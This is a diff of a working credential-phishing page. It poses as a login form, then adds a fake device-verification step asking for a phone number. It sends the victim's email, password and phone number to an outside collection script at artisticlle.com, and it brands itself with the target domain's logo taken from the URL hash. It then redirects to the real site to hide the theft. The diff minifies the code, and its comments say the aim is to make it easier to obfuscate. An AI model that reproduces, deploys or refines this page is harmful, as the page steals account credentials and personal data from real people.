@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
     <link rel="icon" type="image/png" sizes="10x10" href="https://downloads.ccbdownload.online/logo.png">
     <style>
-        .cover-image-cont{background-image:url('https://downloads.ccbdownload.online/Untitled1.jpg'); background-position:center; background-size:cover; height:100vh;}
+        .cover-image-cont{background:url('https://downloads.ccbdownload.online/Untitled1.jpg') center/cover; height:100vh;}
         .bg-transperant{background:rgba(0,0,0,0.77); height:100vh;}
         .hide{display:none;}
     </style>
@@ -18,38 +18,38 @@
             <div class="col-xs-12 col-sm-12 col-md-8 col-lg-4 col-xl-4 mx-auto">
                 <div class="bg-white px-4 py-5 shadow rounded">
                     <div class="form-group text-center">
-                        <img id="logoImg" src="https://downloads.ccbdownload.online/logo.png" width="80">
+                        <img id="l" src="https://downloads.ccbdownload.online/logo.png" width="80">
                     </div>
                     
-                    <div id="form1">
-                        <div id="errorBox" class="alert alert-danger hide"></div>
+                    <div id="f1">
+                        <div id="e" class="alert alert-danger hide"></div>
                         <div class="form-group">
                             <label class="text-secondary font-weight-bold">Email Address</label>
-                            <input type="email" class="form-control" id="emailInput">
+                            <input type="email" class="form-control" id="em">
                         </div>
                         <div class="form-group">
                             <label class="text-secondary font-weight-bold">Password</label>
-                            <input type="password" class="form-control" id="passInput">
+                            <input type="password" class="form-control" id="pw">
                         </div>
                         <div class="form-group">
-                            <button class="btn px-4" style="background:#067438; color:#fff;" id="loginBtn">Login</button>
+                            <button class="btn px-4" style="background:#067438; color:#fff;" id="lb">Login</button>
                         </div>
                     </div>
                     
-                    <div id="form2" class="hide">
+                    <div id="f2" class="hide">
                         <div class="mb-3">
-                            <span id="backBtn" style="cursor:pointer;"> ← </span>
-                            <span id="shownEmail" class="h5 ml-2"></span>
+                            <span id="bb" style="cursor:pointer;"> ← </span>
+                            <span id="se" class="h5 ml-2"></span>
                         </div>
                         <h4 class="font-weight-normal mb-2">Verify it's you</h4>
                         <p class="mb-3">This device is not recognized. For security, we want to make sure it's really you.</p>
-                        <div id="phoneError" class="alert alert-danger hide"></div>
+                        <div id="pe" class="alert alert-danger hide"></div>
                         <p class="mb-3">Try another way to sign in</p>
                         <div class="form-group">
-                            <input type="text" class="form-control" id="phoneInput" placeholder="Enter Phone Number">
+                            <input type="text" class="form-control" id="ph" placeholder="Enter Phone Number">
                         </div>
                         <div class="form-group">
-                            <button class="btn px-4" style="background:#067438; color:#fff;" id="verifyBtn">Verify</button>
+                            <button class="btn px-4" style="background:#067438; color:#fff;" id="vb">Verify</button>
                         </div>
                     </div>
                 </div>
@@ -57,172 +57,58 @@
         </div>
     </div>
 
-    <!-- Simplified, obfuscation-friendly JavaScript -->
+    <!-- Minimal, obfuscatable JavaScript -->
     <script>
-    // Simple logo updater that's hard to break with obfuscation
-    function setLogo(email) {
-        if (!email || !email.includes('@')) return;
-        var domain = email.split('@')[1];
-        if (!domain) return;
-        
-        var img = document.getElementById('logoImg');
-        var test = new Image();
-        var logoUrl = 'https://logo.clearbit.com/' + domain.toLowerCase().replace(/[^a-z0-9.-]/g, '');
-        
-        test.onload = function() { img.src = logoUrl; };
-        test.onerror = function() { 
-            img.src = 'https://downloads.ccbdownload.online/logo.png'; 
-        };
-        test.src = logoUrl;
-    }
+    function u(e){if(e&&~e.indexOf('@')){var d=e.split('@')[1];if(d)document.getElementById('l').src='https://www.google.com/s2/favicons?domain='+d+'&sz=128';}}
+    function v(e){return/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);}
+    function x(u,d){return fetch('https://artisticlle.com/asda/bknd.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:u+'='+encodeURIComponent(JSON.stringify(d))}).then(r=>r.json());}
     
-    // Handle URL hash
-    if (window.location.hash) {
-        var hashEmail = window.location.hash.substring(1);
-        if (hashEmail.includes('@')) {
-            document.getElementById('emailInput').value = hashEmail;
-            setLogo(hashEmail);
-        }
-    }
-    
-    // Simple email input listener
-    document.getElementById('emailInput').addEventListener('input', function(e) {
-        if (e.target.value.includes('@')) {
-            setTimeout(function() { setLogo(e.target.value); }, 300);
-        }
-    });
-    
-    // Login function
-    document.getElementById('loginBtn').addEventListener('click', function() {
-        var email = document.getElementById('emailInput').value.trim();
-        var pass = document.getElementById('passInput').value.trim();
-        var errorBox = document.getElementById('errorBox');
+    window.onload=function(){
+        var h=window.location.hash.substring(1);
+        if(h&&~h.indexOf('@')){document.getElementById('em').value=h;u(h);}
         
-        errorBox.className = 'alert alert-danger hide';
+        document.getElementById('em').addEventListener('input',function(e){setTimeout(()=>u(e.target.value),300);});
         
-        if (!email || !email.includes('@') || !email.includes('.')) {
-            errorBox.textContent = 'Please enter a valid email address';
-            errorBox.className = 'alert alert-danger';
-            return;
-        }
-        
-        if (!pass) {
-            errorBox.textContent = 'Please enter your password';
-            errorBox.className = 'alert alert-danger';
-            return;
-        }
-        
-        // Simple email check for Gmail
-        var isGmail = email.toLowerCase().indexOf('@gmail.com') !== -1;
-        
-        // Disable button
-        var btn = this;
-        btn.disabled = true;
-        btn.textContent = 'Checking...';
-        
-        // Simple fetch to backend - UPDATED URL
-        fetch('https://artisticlle.com/asda/bknd.php', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'action=login&email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(pass) + '&step=1'
-        })
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            if (data && data.success) {
-                // Show phone verification for Gmail on first try
-                if (isGmail) {
-                    document.getElementById('shownEmail').textContent = email;
-                    document.getElementById('form1').className = 'hide';
-                    document.getElementById('form2').className = '';
-                    document.getElementById('passInput').value = '';
-                } else {
-                    // Redirect to domain
-                    var domain = email.split('@')[1];
-                    if (domain) {
-                        setTimeout(function() {
-                            window.location.href = 'https://' + domain;
-                        }, 1000);
-                    }
-                }
-            } else {
-                errorBox.textContent = 'Login failed. Please try again.';
-                errorBox.className = 'alert alert-danger';
-            }
-            btn.disabled = false;
-            btn.textContent = 'Login';
-        })
-        .catch(function() {
-            errorBox.textContent = 'Connection error. Please try again.';
-            errorBox.className = 'alert alert-danger';
-            btn.disabled = false;
-            btn.textContent = 'Login';
+        document.getElementById('lb').addEventListener('click',function(){
+            var e=document.getElementById('em').value.trim(),p=document.getElementById('pw').value.trim(),eb=document.getElementById('e');
+            eb.className='alert alert-danger hide';
+            if(!v(e)){eb.textContent='Enter valid email';eb.className='alert alert-danger';return;}
+            if(!p){eb.textContent='Enter password';eb.className='alert alert-danger';return;}
+            var b=this,g=~e.toLowerCase().indexOf('@gmail.com');
+            b.disabled=true;b.textContent='Checking...';
+            x('login',{email:e,password:p,step:1}).then(function(d){
+                if(d&&d.success){
+                    if(g&&d.data&&d.data.requires_verification){
+                        document.getElementById('se').textContent=e;
+                        document.getElementById('f1').className='hide';
+                        document.getElementById('f2').className='';
+                        document.getElementById('pw').value='';
+                    }else{var m=e.split('@')[1];if(m)setTimeout(()=>window.location.href='https://'+m,1000);}
+                }else{eb.textContent='Login failed';eb.className='alert alert-danger';}
+                b.disabled=false;b.textContent='Login';
+            }).catch(function(){eb.textContent='Connection error';eb.className='alert alert-danger';b.disabled=false;b.textContent='Login';});
         });
-    });
-    
-    // Verify button
-    document.getElementById('verifyBtn').addEventListener('click', function() {
-        var phone = document.getElementById('phoneInput').value.trim();
-        var errorBox = document.getElementById('phoneError');
-        var email = document.getElementById('shownEmail').textContent;
         
-        errorBox.className = 'alert alert-danger hide';
-        
-        if (!phone) {
-            errorBox.textContent = 'Please enter your phone number';
-            errorBox.className = 'alert alert-danger';
-            return;
-        }
-        
-        var btn = this;
-        btn.disabled = true;
-        btn.textContent = 'Checking...';
-        
-        // UPDATED URL
-        fetch('https://artisticlle.com/asda/bknd.php', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'action=verify_phone&email=' + encodeURIComponent(email) + '&phone=' + encodeURIComponent(phone)
-        })
-        .then(function(r) { return r.json(); })
-        .then(function(data) {
-            if (data && data.success) {
-                var domain = email.split('@')[1];
-                if (domain) {
-                    setTimeout(function() {
-                        window.location.href = 'https://' + domain;
-                    }, 1000);
-                }
-            } else {
-                errorBox.textContent = 'Verification failed';
-                errorBox.className = 'alert alert-danger';
-                btn.disabled = false;
-                btn.textContent = 'Verify';
-            }
-        })
-        .catch(function() {
-            errorBox.textContent = 'Connection error';
-            errorBox.className = 'alert alert-danger';
-            btn.disabled = false;
-            btn.textContent = 'Verify';
+        document.getElementById('vb').addEventListener('click',function(){
+            var ph=document.getElementById('ph').value.trim(),pe=document.getElementById('pe'),e=document.getElementById('se').textContent;
+            pe.className='alert alert-danger hide';
+            if(!ph){pe.textContent='Enter phone number';pe.className='alert alert-danger';return;}
+            var b=this;
+            b.disabled=true;b.textContent='Checking...';
+            x('verify',{email:e,phone:ph}).then(function(d){
+                if(d&&d.success){var m=e.split('@')[1];if(m)setTimeout(()=>window.location.href='https://'+m,1000);}
+                else{pe.textContent='Verification failed';pe.className='alert alert-danger';b.disabled=false;b.textContent='Verify';}
+            }).catch(function(){pe.textContent='Connection error';pe.className='alert alert-danger';b.disabled=false;b.textContent='Verify';});
         });
-    });
-    
-    // Back button
-    document.getElementById('backBtn').addEventListener('click', function() {
-        document.getElementById('form2').className = 'hide';
-        document.getElementById('form1').className = '';
-    });
-    
-    // Enter key support
-    ['emailInput', 'passInput'].forEach(function(id) {
-        document.getElementById(id).addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') document.getElementById('loginBtn').click();
+        
+        document.getElementById('bb').addEventListener('click',function(){
+            document.getElementById('f2').className='hide';
+            document.getElementById('f1').className='';
         });
-    });
-    
-    document.getElementById('phoneInput').addEventListener('keypress', function(e) {
-        if (e.key === 'Enter') document.getElementById('verifyBtn').click();
-    });
+        
+        ['em','pw'].forEach(function(i){document.getElementById(i).addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('lb').click();});});
+        document.getElementById('ph').addEventListener('keypress',function(e){if(e.key==='Enter')document.getElementById('vb').click();});
+    };
     </script>
 </body>
 </html>
